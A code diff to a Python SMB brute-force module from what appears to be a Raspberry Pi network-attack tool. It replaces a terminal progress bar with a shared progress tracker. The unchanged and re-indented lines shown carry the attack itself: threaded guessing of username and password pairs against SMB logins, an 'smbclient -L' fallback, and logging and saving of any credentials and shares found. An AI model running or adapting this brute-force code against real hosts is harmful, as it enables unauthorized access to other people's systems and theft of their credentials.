@@ -8,7 +8,7 @@ import logging
 import time
 from subprocess import Popen, PIPE
 from rich.console import Console
-from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
+from actions.bruteforce_common import ProgressTracker
 from smb.SMBConnection import SMBConnection
 from queue import Queue
 from shared import SharedData
@@ -154,7 +154,7 @@ class SMBConnector:
                     shares.append(parts[0])
         return shares
 
-    def worker(self, progress, task_id, success_flag):
+    def worker(self, tracker, success_flag):
         """
         Worker thread to process items in the queue.
         """
@@ -175,7 +175,7 @@ class SMBConnector:
                     self.removeduplicates()
                     success_flag[0] = True
             self.queue.task_done()
-            progress.update(task_id, advance=1)
+            tracker.advance()
 
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
@@ -195,52 +195,51 @@ class SMBConnector:
         success_flag = [False]
         threads = []
 
-        # SMB-3: the smbclient fallback previously ran OUTSIDE the
-        # with Progress(...) context, so progress.update(task_id, ...) raised
-        # NameError because progress and task_id were already out of scope.
-        # Both blocks now share the same Progress context.
-        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
-            task_id = progress.add_task("[cyan]Bruteforcing SMB...", total=total_tasks)
+        # PORT-9: ProgressTracker (shared_data.bjorn_progress) replaces the
+        # rich Progress TTY bar. The smbclient -L fallback below shares the
+        # same tracker (previously it shared the same Progress context to
+        # avoid a NameError on progress/task_id — SMB-3; with a tracker that
+        # scoping issue no longer exists).
+        tracker = ProgressTracker(self.shared_data, total_tasks)
 
-            for _ in range(10):  # Limit threads for RPi Zero (512MB RAM, 1 core)
-                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
-                t.start()
-                threads.append(t)
+        for _ in range(10):  # Limit threads for RPi Zero (512MB RAM, 1 core)
+            t = threading.Thread(target=self.worker, args=(tracker, success_flag))
+            t.start()
+            threads.append(t)
 
-            while not self.queue.empty():
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                    while not self.queue.empty():
-                        self.queue.get()
-                        self.queue.task_done()
-                    break
+        while not self.queue.empty():
+            if self.shared_data.orchestrator_should_exit:
+                logger.info("Orchestrator exit signal received, stopping bruteforce.")
+                while not self.queue.empty():
+                    self.queue.get()
+                    self.queue.task_done()
+                break
 
-            self.queue.join()
+        self.queue.join()
 
-            for t in threads:
-                t.join()
+        for t in threads:
+            t.join()
 
-            # If no success with direct SMB connection, try smbclient -L
-            # INSIDE the same with Progress context so progress/task_id are
-            # still valid (SMB-3).
-            if not success_flag[0]:
-                logger.info(f"No successful authentication with direct SMB connection. Trying smbclient -L for {adresse_ip}")
-                for user in self.users:
-                    for password in self.passwords:
-                        progress.update(task_id, advance=1)
-                        shares = self.smbclient_l(adresse_ip, user, password)
-                        if shares:
-                            with self.lock:
-                                for share in shares:
-                                    if share not in IGNORED_SHARES:
-                                        self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
-                                        logger.success(f"(SMB) Found credentials for IP: {adresse_ip} | User: {user} | Share: {share} using smbclient -L")
-                                        self.save_results()
-                                        self.removeduplicates()
-                                        success_flag[0] = True
-                        if self.shared_data.timewait_smb > 0:
-                            time.sleep(self.shared_data.timewait_smb)  # Wait for the specified interval before the next attempt
+        # If no success with direct SMB connection, try smbclient -L.
+        if not success_flag[0]:
+            logger.info(f"No successful authentication with direct SMB connection. Trying smbclient -L for {adresse_ip}")
+            for user in self.users:
+                for password in self.passwords:
+                    tracker.advance()
+                    shares = self.smbclient_l(adresse_ip, user, password)
+                    if shares:
+                        with self.lock:
+                            for share in shares:
+                                if share not in IGNORED_SHARES:
+                                    self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
+                                    logger.success(f"(SMB) Found credentials for IP: {adresse_ip} | User: {user} | Share: {share} using smbclient -L")
+                                    self.save_results()
+                                    self.removeduplicates()
+                                    success_flag[0] = True
+                    if self.shared_data.timewait_smb > 0:
+                        time.sleep(self.shared_data.timewait_smb)  # Wait for the specified interval before the next attempt
 
+        tracker.set_complete()
         return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
 
     def save_results(self):
